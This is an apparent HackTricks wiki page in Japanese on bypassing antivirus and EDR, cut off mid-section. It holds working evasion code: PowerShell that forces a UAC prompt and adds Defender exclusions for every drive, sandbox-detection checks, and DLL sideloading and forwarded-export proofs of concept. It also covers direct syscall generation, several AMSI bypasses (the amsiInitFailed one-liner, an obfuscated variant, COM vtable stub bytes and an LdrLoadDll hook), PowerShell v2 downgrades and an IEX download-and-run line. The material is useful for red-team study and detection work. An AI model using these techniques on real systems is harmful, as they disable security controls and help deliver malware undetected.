# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページの初稿執筆者:** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender の動作を停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別の AV を装って Windows Defender の動作を停止するツール。
- [管理者権限がある場合に Defender を無効化する](basic-powershell-for-pentesters/README.md)

### Defender を改変する前のインストーラー風 UAC bait

ゲームチートを装う公開ローダーは、署名されていない Node.js/Nexe インストーラーとして配布されることがよくあり、まず**ユーザーに昇格を求めてから** Defender を無効化します。流れはシンプルです。

1. `net session` で管理者コンテキストを確認します。このコマンドは呼び出し元が管理者権限を持つ場合にのみ成功するため、失敗した場合、ローダーは標準ユーザーとして実行されています。
2. 元のコマンドラインを維持したまま、`RunAs` 動詞を使って直ちに自身を再起動し、想定される UAC の同意プロンプトを表示させます。

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

被害者はすでに「クラック版」ソフトウェアをインストールしていると信じているため、通常はプロンプトを受け入れ、マルウェアにDefenderのポリシーを変更するために必要な権限を与えてしまいます。<sup>[[26]](#references)</sup>

### すべてのドライブ文字に対する一律の `MpPreference` 除外設定

昇格後、GachiLoader型のチェーンはサービスを完全に無効化するのではなく、Defenderの死角を最大化します。まずローダーはGUIのウォッチドッグ（`taskkill /F /IM SecHealthUI.exe`）を停止し、次に**極めて広範な除外設定**を追加して、すべてのユーザープロファイル、システムディレクトリ、リムーバブルディスクをスキャン対象外にします。

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- ループはマウントされているすべてのファイルシステム（D:\、E:\、USBメモリなど）を走査するため、**今後ディスク上のどこかに配置される payload はすべて無視されます**。
- `.sys` 拡張子の除外は将来を見越したものです。攻撃者は、後から Defender に再度触れることなく unsigned driver を読み込める選択肢を残しています。
- 変更はすべて `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` の下に適用されるため、後続のステージで除外設定が維持されているかを確認したり、UAC を再度発生させることなく除外対象を拡張したりできます。

Defender のサービスは停止されないため、単純なヘルスチェックでは「antivirus active」と報告され続けますが、実際にはリアルタイム検査がこれらのパスを対象にしなくなります。<sup>[[26]](#references)</sup>

## **AV Evasion の手法**

現在、AV はファイルが悪意のあるものかどうかを判定するために、静的検出、動的解析、さらに高度な EDR では振る舞い分析など、さまざまな手法を使用しています。

### **静的検出**

静的検出では、バイナリやスクリプト内にある既知の悪意ある文字列やバイト列を検出するほか、ファイル自体から情報（例：ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）を抽出します。そのため、既知の公開ツールを使うと検出されやすくなります。おそらくすでに解析され、悪意あるものとしてフラグが付けられているからです。この種の検出を回避する方法はいくつかあります。

- **暗号化**

バイナリを暗号化すれば、AV がプログラムを検出する方法はなくなりますが、メモリ上でプログラムを復号して実行するための loader が必要になります。

- **難読化**

バイナリやスクリプト内の文字列をいくつか変更するだけで AV をすり抜けられる場合もありますが、難読化する対象によっては時間のかかる作業になります。

- **独自ツールの開発**

独自のツールを開発すれば、既知の不正なシグネチャは存在しませんが、多くの時間と労力が必要です。

> [!TIP]
> Windows Defender の静的検出に対する確認には、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) が便利です。ファイルを複数のセグメントに分割し、それぞれを Defender にスキャンさせることで、バイナリ内のどの文字列やバイトがフラグ付けされたのかを特定できます。

実践的な AV Evasion については、こちらの [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) をぜひご覧ください。

### 静的分類器に対するオフラインの PE 特徴テスト

圧縮または暗号化された payload のバイト列は、静的分類器が使う入力の一つにすぎません。EMBER2024 は、imports、exports、sections、headers、Authenticode data など、PE の特徴を抽出します。<sup>[[48]](#references)</sup> ある loader の実験では、無害に見える imports を141個追加すると EMBER2024 の悪意あるスコアが93%低下し、マルウェアに関連付けられた imports を追加するとスコアが上昇しました。これはそのモデルとサンプルでの結果であり、特定の AV/EDR 製品を確実に回避できる方法ではありません。<sup>[[50]](#references)</sup>

許可を得た loader のテストでは、payload と実行経路を一定に保ち、ビルドごとに変更する変数は一つにして、スコアをオフラインで比較してください。ビルドの変更は複数の特徴グループに影響することがあるため、生成された PE の特徴を確認してください。<sup>[[49]](#references)[[50]](#references)</sup> 意図した imports を IAT に残すには、選択した Win32 API を到達可能なコードから呼び出してください。選択内容を変え、ビルドごとに呼び出し箇所を分散させます。固定の偽装用関数を作ると、シグネチャとして検出される可能性があります。この実験では、有効なコード署名、export entries、`.pdata` を拡大する関数の増加によってスコアが低下したことも報告されています。無効な署名の影響はほとんどなく、`.pdata` の効果も小さいものでした。<sup>[[50]](#references)</sup>

`thrember` パッケージは、特徴抽出とベンチマークモデルを提供します。インストール後、既存の `models` ディレクトリを使って `thrember.download_models("models")` を実行し、その後、親ディレクトリからスコア計算を実行します。ダウンロード用ヘルパーは現在の作業ディレクトリを変更するためです。PE classifier を使えば、スキャンサービスに送信することなく、ビルドを含むディレクトリをスコアリングできます。<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

比較中は、modelとfeature-extractorのバージョンを固定してください。オフラインスコアが低下しても、それはこのclassifierが変更後のbinaryにどう反応するかを示すだけであり、behavioral analysis、emulation、またはvendorの異なるmodelを回避できた証明にはなりません。<sup>[[49]](#references)[[50]](#references)</sup> [仮想化されたpayloadにおけるビルドごとのpolymorphismと外側のbinaryのcamouflage](virtualized-payload-execution.md#camouflaging-the-outer-go-executable)については、別の実行モデルを参照してください。

### **動的解析**

動的解析とは、AVがsandbox内でbinaryを実行し、悪意のある活動（例: browserのpasswordを復号して読み取ろうとする、LSASSのminidumpを実行するなど）を監視することです。この対策は少し難しい場合がありますが、sandboxを回避するためにできることをいくつか紹介します。

- **実行前にsleepする** 実装方法によっては、AVの動的解析を回避する有効な方法です。AVがファイルをスキャンできる時間は、ユーザーの作業を妨げないよう非常に短いため、長いsleepを使うとbinaryの解析を妨害できます。ただし、AVのsandboxの多くは、実装方法によってはsleepをスキップできるという問題があります。
- **マシンのリソースを確認する** 通常、sandboxが利用できるリソースは非常に少なく（例: RAMが2GB未満）、そうでなければユーザーのマシンの動作が遅くなる可能性があります。また、CPUの温度やファンの回転速度を確認するなど、工夫の余地もあります。sandboxではすべてが実装されているわけではありません。
- **マシン固有のチェック** 「contoso.local」ドメインに参加しているユーザーのworkstationを対象にしたい場合、コンピューターのドメインを確認し、指定したものと一致するかをチェックできます。一致しなければ、プログラムを終了させることができます。

Microsoft Defenderのsandboxのコンピューター名はHAL9THであることがわかっています。そのため、detonation前にmalwareでコンピューター名を確認できます。名前がHAL9THと一致すれば、Defenderのsandbox内にいることを意味するため、プログラムを終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxへの対策について、[@mgeeky](https://twitter.com/mariuszbit)による他の優れたヒントを紹介します。

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

この記事で前述したように、**public tools**は最終的に**検出されます**。そのため、次のことを自問してください。

たとえば、LSASSをdumpしたい場合、**本当にmimikatzを使う必要がありますか**？ それとも、あまり知られておらず、LSASSもdumpできる別のprojectを使えますか？

おそらく後者が正解です。mimikatzを例にとると、AVやEDRに最も多く検知されるmalwareの一つ、あるいは最も検知されるmalwareと言ってもよいでしょう。project自体はとても優れていますが、AVを回避するために使うのは悪夢のように大変です。実現したいことに対する代替手段を探しましょう。

> [!TIP]
> 回避のためにpayloadを変更する際は、Defenderで**自動サンプル送信をオフにする**ようにしてください。また、長期的な回避を目指すのであれば、**絶対にVIRUSTOTALにアップロードしないでください**。特定のAVにpayloadが検出されるか確認したい場合は、VMにインストールし、自動サンプル送信をオフにして、結果に納得できるまでそこでテストしてください。

## EXEsとDLLs

可能な場合は常に、**回避にはDLLを優先して使ってください**。私の経験では、DLLファイルは通常、**検出・解析される可能性がかなり低い**ため、場合によっては検出を避ける非常に簡単な方法になります（もちろん、payloadをDLLとして実行する方法がある場合に限ります）。

この画像からわかるように、HavocのDLL Payloadはantiscan.meで4/26の検出率ですが、EXE payloadの検出率は7/26です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>通常のHavoc EXE payloadと通常のHavoc DLLのantiscan.meでの比較</p></figcaption></figure>

次に、DLLファイルを使ってさらにステルス性を高めるためのコツをいくつか紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading**は、victim applicationと悪意のあるpayloadを同じ場所に配置し、loaderが使用するDLLの検索順序を利用します。

[Siofra](https://github.com/Cybereason/siofra)と次のpowershell scriptを使って、DLL Sideloadingの影響を受けやすいprogramを確認できます。

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

このコマンドは、"C:\Program Files\\" 内で DLL hijacking の影響を受けるプログラムと、それらが読み込もうとする DLL ファイルの一覧を出力します。

**DLL Hijackable/Sideloadable なプログラムを自分で調査することを強くおすすめします**。この technique は適切に実行すればかなり stealthy ですが、公開されている DLL Sideloadable なプログラムを使うと、簡単に見つかる可能性があります。

プログラムが読み込もうとする名前の悪意ある DLL を配置するだけでは、payload は読み込まれません。プログラムはその DLL 内に特定の関数があることを想定しているためです。この問題を解決するために、**DLL Proxying/Forwarding** と呼ばれる別の technique を使います。

**DLL Proxying** は、プログラムからの呼び出しを proxy（および悪意ある）DLL から元の DLL に転送します。これにより、プログラムの機能を維持しながら、payload の実行を処理できます。

[@flangvik](https://twitter.com/Flangvik/) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project を使用します。

以下が実行した手順です。

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

最後のコマンドで、DLLのソースコードテンプレートと、名前を変更した元のDLLの2つのファイルが生成されます。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

shellcode（[SGN](https://github.com/EgeBalci/sgn)でエンコード）とproxy DLLの両方が、[antiscan.me](https://antiscan.me)でDetection rate 0/26でした！成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloadingについて詳しく学ぶために、[S3cur3Th1sSh1tのtwitch VOD](https://www.twitch.tv/videos/1644171543)と[ippsecの動画](https://www.youtube.com/watch?v=3eROsG_WNpE)を見ることを**強くおすすめ**します。今回の内容について、さらに詳しく解説されています。

### Forwarded Exportsの悪用（ForwardSideLoading）

Windows PEモジュールは、実際には「forwarder」である関数をエクスポートできます。つまり、エクスポートエントリはコードを指すのではなく、`TargetDll.TargetFunc`形式のASCII文字列を含みます。呼び出し元がそのエクスポートを解決すると、Windows loaderは次の処理を行います。

- `TargetDll`がまだロードされていない場合はロードする
- そこから`TargetFunc`を解決する

理解しておくべき主な動作：
- `TargetDll`がKnownDLLの場合、保護されたKnownDLLs名前空間（例：ntdll、kernelbase、ole32）から提供されます。<sup>[[15]](#references)</sup>
- `TargetDll`がKnownDLLでない場合は、通常のDLL検索順序が使われます。この検索順序には、forward解決を行うモジュールのディレクトリが含まれます。

これにより、間接的なsideloading手法が可能になります。関数がKnownDLLではないモジュール名にforwardされている、署名済みDLLを見つけ、その署名済みDLLと同じディレクトリに、forward先のモジュールと完全に同じ名前を付けた、攻撃者が制御するDLLを配置します。forwardされたexportが呼び出されると、loaderがforward先を解決し、同じディレクトリから自分のDLLをロードして、DllMainを実行します。<sup>[[13]](#references)</sup>

Windows 11で確認された例：

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC（コピー＆ペースト）:
1) 署名済みのシステム DLL を書き込み可能なフォルダーにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` を配置します。コード実行には最小限の DllMain で十分です。DllMain を実行させるために、転送先関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) 署名済みLOLBinでforwardをトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

確認された挙動:
- rundll32（署名済み）がサイドバイサイドの `keyiso.dll`（署名済み）を読み込む
- `KeyIsoSetAuditingInterface` の解決中、ローダーは転送先の `NCRYPTPROV.SetAuditingInterface` をたどる
- ローダーはその後、`C:\test` から `NCRYPTPROV.dll` を読み込み、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合でも、「missing API」エラーが発生するのは `DllMain` の実行後

探索のヒント:
- 転送先のモジュールが KnownDLL ではない転送エクスポートに注目してください。KnownDLL は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に登録されています。
- 次のようなツールを使って、転送エクスポートを列挙できます:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を探すには、Windows 11 forwarder inventory を参照してください：https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

検知／防御のアイデア:
- LOLBins（例：rundll32.exe）がシステム以外のパスから署名済み DLL を読み込み、その後、同じディレクトリから同じベース名を持つ KnownDLLs 以外の DLL を読み込む動作を監視する
- 次のようなプロセス／モジュールの連鎖を検知する：ユーザーが書き込み可能なパスにある `rundll32.exe` → システム以外の `keyiso.dll` → `NCRYPTPROV.dll`
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの書き込みと実行を拒否する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze は、suspended process、direct syscall、代替実行方式を利用して EDR を回避するための payload toolkit です`

Freeze を使うと、ステルス性を保ちながら shellcode を読み込んで実行できます。

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionはいたちごっこです。今日有効な手法が明日には検出される可能性があるため、1つのツールだけに頼らず、可能であれば複数のEvasionテクニックを組み合わせてください。

## Direct/Indirect Syscalls と SSN 解決 (SysWhispers4)

EDRはしばしば、`ntdll.dll` の syscall stub に **user-mode inline hook** を設置します。これらのhookを回避するには、正しい **SSN** (System Service Number) を読み込み、hookされたexportのエントリポイントを実行せずにkernel modeへ移行する **direct** または **indirect** syscall stubを生成できます。<sup>[[32]](#references)</sup>

**呼び出し方法:**
- **Direct (embedded)**: 生成されたstubに `syscall`/`sysenter`/`SVC #0` 命令を埋め込みます (`ntdll` exportを経由しません)。
- **Indirect**: `ntdll` 内にある既存の `syscall` gadgetへジャンプし、kernelへの移行が `ntdll` から始まったように見せます (ヒューリスティックな検出の回避に有用)。**randomized indirect** では、呼び出しごとにpoolからgadgetを選択します。
- **Egg-hunt**: 静的な `0F 05` opcodeのシーケンスをディスク上に埋め込まず、実行時にsyscallのシーケンスを解決します。

**hook耐性のあるSSN解決方法:**
- **FreshyCalls (VA sort)**: stubのbyteを読み取る代わりに、syscall stubをvirtual address順に並べてSSNを推定します。
- **SyscallsFromDisk**: クリーンな `\KnownDlls\ntdll.dll` をmapし、その `.text` からSSNを読み取ってからunmapします (メモリ上のすべてのhookを回避します)。
- **RecycledGate**: VA順によるSSN推定と、stubがクリーンな場合のopcode検証を組み合わせます。hookされている場合はVA順による推定にフォールバックします。
- **HW Breakpoint**: `syscall` 命令にDR0を設定し、VEHを使って実行時に `EAX` からSSNを取得します。hookされたbyteを解析する必要はありません。

SysWhispers4の使用例:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSIは「[ファイルレスマルウェア](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作られました。当初、AVがスキャンできるのは**ディスク上のファイル**だけでした。そのため、ペイロードを何らかの方法で**メモリ内で直接**実行できれば、AVには十分な可視性がなく、それを防ぐことはできませんでした。

AMSI機能は、Windowsの以下のコンポーネントに統合されています。

- ユーザーアカウント制御（UAC）（EXE、COM、MSI、ActiveXのインストール時の昇格）
- PowerShell（スクリプト、対話型の使用、動的コード評価）
- Windows Script Host（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBAマクロ

これにより、スクリプトの内容を暗号化も難読化もされていない形式で公開し、ウイルス対策ソリューションがスクリプトの動作を検査できるようになります。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`を実行すると、Windows Defenderで次のアラートが表示されます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`に続いて、スクリプトを実行した実行ファイルのパスが付加されていることに注目してください。この場合はpowershell.exeです。

ディスクにファイルをドロップしていませんが、AMSIによってメモリ内で検出されました。

さらに、**.NET 4.8**以降では、C#コードもAMSIを通じて実行されます。これは、メモリ内で実行するために`Assembly.Load(byte[])`を使用する場合にも影響します。そのため、AMSIを回避したい場合、メモリ内での実行には古いバージョンの.NET（4.7.2以下など）の使用が推奨されます。

AMSIを回避する方法はいくつかあります。

- **難読化**

AMSIは主に静的検出を行うため、読み込もうとするスクリプトを変更すれば、検出を回避できる場合があります。

ただし、AMSIには複数のレイヤーがあるスクリプトでも難読化を解除する機能があるため、やり方によっては難読化が逆効果になることがあります。そのため、回避はそれほど単純ではありません。一方で、変数名をいくつか変更するだけでうまくいく場合もあるため、どの程度検知対象としてマークされているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（およびcscript.exe、wscript.exeなど）のプロセスに読み込むことで実装されているため、非特権ユーザーとして実行中でも簡単に改変できます。このAMSI実装上の欠陥を受けて、研究者たちはAMSIスキャンを回避する方法を複数発見しました。

**エラーを強制する**

AMSIの初期化を失敗させる（amsiInitFailed）と、現在のプロセスではスキャンが開始されません。この方法は当初[Matt Graeber](https://twitter.com/mattifestation)によって公開され、その後Microsoftは広範な利用を防ぐためのシグネチャを開発しました。

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

PowerShellのコードを1行実行するだけで、現在のPowerShellプロセスでAMSIを使用不能にできました。もちろん、この行自体がAMSIによって検知されるため、この手法を使うには何らかの変更が必要です。

以下は、[Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)から引用した、変更を加えたAMSI bypassです。

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

この投稿が公開されたら、おそらく検出されるので、検出を避け続けるつもりならコードを公開しないようにしてください。

**Memory Patching**

この technique は [@RastaMouse](https://twitter.com/_RastaMouse/) によって最初に発見されました。amsi.dll 内の「AmsiScanBuffer」関数（ユーザーが入力した内容のスキャンを担当）のアドレスを見つけ、E_INVALIDARG のコードを返す命令で上書きします。これにより、実際のスキャン結果は 0 となり、クリーンな結果として解釈されます。

> [!TIP]
> 詳細については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

powershell で AMSI を bypass する technique は他にも多数あります。詳しくは[**こちらのページ**](basic-powershell-for-pentesters/index.html#amsi-bypass)と[**こちらの repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)をご覧ください。

### `AmsiScanBuffer` の patching ではなく、AMSI COM の scan-pointer をリダイレクトする

別の process-local bypass では、`AmsiScanBuffer` のエントリーポイントには手を加えません。報告された 64-bit .NET loader では、CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` から AMSI COM object を作成し、`Marshal.GetIUnknownForObject()` でインターフェースポインターを取得します。その vtable のオフセット `0x18` にあるスロットが、scan-call のターゲットとして使用されます。loader は `Console.Clear()` の native pointer に小さな x64 stub を書き込み、`VirtualProtect()` を使って vtable のエントリーをその stub に変更した後、元のページ保護を復元します。64-bit のポインター幅と想定される COM レイアウトが前提条件です。これは、任意の AMSI インターフェースやビルドに使える汎用的なオフセットではありません。先行して確認された段階は、[signed AppDomainManager sidecar loading](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) と [RESX deserialization](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml) です。<sup>[[51]](#references)</sup>

確認された stub のバイト列は `41 C7 00 01 00 00 00 33 C0 C3` です。これは `r8` の結果ポインターに **1** を書き込み、`eax` に **0** を返します。そのため、スキャン結果が `AMSI_RESULT_CLEAN` (0) だという報告上の主張は、`S_OK` の戻り値と出力 enum を混同しています。文書化されている `AMSI_RESULT` の順序では、結果 **1** は `AMSI_RESULT_NOT_DETECTED` です。これは引き続き検出しきい値を下回ります。<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### amsi.dll の読み込みを防いで AMSI をブロックする（LdrLoadDll hook）

AMSI は、現在のプロセスに `amsi.dll` が読み込まれた後にのみ初期化されます。堅牢で言語に依存しない bypass は、`ntdll!LdrLoadDll` に user-mode hook を設置し、要求されたモジュールが `amsi.dll` の場合にエラーを返す方法です。その結果、AMSI は読み込まれず、そのプロセスではスキャンが行われません。<sup>[[23]](#references)</sup>

実装の概要（x64 C/C++ の疑似コード）:
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
メモ
- PowerShell、WScript/CScript、カスタムローダーなど、通常 AMSI を読み込むあらゆるものに対応します。
- 長いコマンドラインの痕跡を避けるため、スクリプトを stdin 経由で渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせてください。
- LOLBins（例: `regsvr32` から `DllRegisterServer` を呼び出す）経由で実行されるローダーでの使用例があります。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** というツールも、AMSI をバイパスするスクリプトを生成します。
**[https://amsibypass.com/](https://amsibypass.com/)** というツールも、ユーザー定義関数、変数、文字式をランダム化し、PowerShell キーワードの大文字・小文字をランダムに変更してシグネチャを回避する、AMSI バイパス用のスクリプトを生成します。

**検出されたシグネチャを削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** などのツールを使って、現在のプロセスのメモリから検出された AMSI シグネチャを削除できます。このツールは、現在のプロセスのメモリをスキャンして AMSI シグネチャを探し、NOP 命令で上書きしてメモリから実質的に削除します。

**AMSI を使用する AV/EDR 製品**

AMSI を使用する AV/EDR 製品の一覧は、**[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell バージョン 2 を使用する**
PowerShell バージョン 2 を使用すると AMSI が読み込まれないため、AMSI にスキャンされずにスクリプトを実行できます。次のようにします:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell loggingは、システム上で実行されたすべてのPowerShellコマンドを記録できる機能です。監査やトラブルシューティングに役立ちますが、**検知を回避したい攻撃者にとっては問題となる場合もあります**。

PowerShell loggingを回避するには、次の手法を使用できます。

- **PowerShell TranscriptionとModule Loggingを無効化する**: この目的には、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)などのツールを使用できます。
- **PowerShell version 2を使用する**: PowerShell version 2ではAMSIが読み込まれないため、AMSIによるスキャンを受けずにスクリプトを実行できます。次のように実行します: `powershell.exe -version 2`
- **非管理PowerShellセッションを使用する**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)を使って`powershell.exe`を起動せずにPowerShellをホストします（Cobalt Strikeの`powerpick`で使われている手法）。これにより、`powershell.exe`プロセスに特化した制御は回避できますが、AMSI、Script Block Logging、その他すべてのPowerShell防御が自動的に無効になるわけではありません。適用範囲はランタイムとホストの実装によって異なります。


## Obfuscation

> [!TIP]
> 複数のobfuscation手法ではデータを暗号化するため、バイナリのエントロピーが増加し、AVやEDRによる検知が容易になることがあります。注意して使用し、機密性が高い、または隠す必要があるコードの特定の部分にのみ暗号化を適用することを検討してください。

### ConfuserExで保護された.NETバイナリのDeobfuscating

ConfuserEx 2（または商用fork）を使ったマルウェアを解析する際には、decompilerやsandboxを妨げる複数の保護レイヤーに遭遇することがよくあります。以下のワークフローを使うと、ほぼ**元のILを確実に復元**でき、その後、dnSpyやILSpyなどのツールでC#にdecompileできます。<sup>[[10]](#references)</sup>

1.  Anti-tamperingの除去 – ConfuserExはすべての*method body*を暗号化し、*module*のstatic constructor（`<Module>.cctor`）内で復号します。また、PE checksumにパッチを適用するため、変更を加えるとバイナリがクラッシュします。**AntiTamperKiller**を使って暗号化されたmetadata tableを特定し、XOR keyを復元して、クリーンなassemblyを書き出します:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   出力には、独自の unpacker を作成する際に役立つ6つの anti-tamper パラメータ（`key0-key3`、`nameHash`、`internKey`）が含まれています。

2.  シンボル / 制御フローの復元 – *clean* なファイルを **de4dot-cex**（ConfuserEx 対応の de4dot の fork）に渡します。
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 profileを選択
     • de4dotはcontrol-flow flatteningを解除し、元のnamespace、class、変数名を復元して、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserExは、逆コンパイルをさらに妨げるため、直接のメソッド呼び出しを軽量なwrapper（*proxy calls*とも呼ばれます）に置き換えます。**ProxyCall-Remover**で削除します：
   ```bash
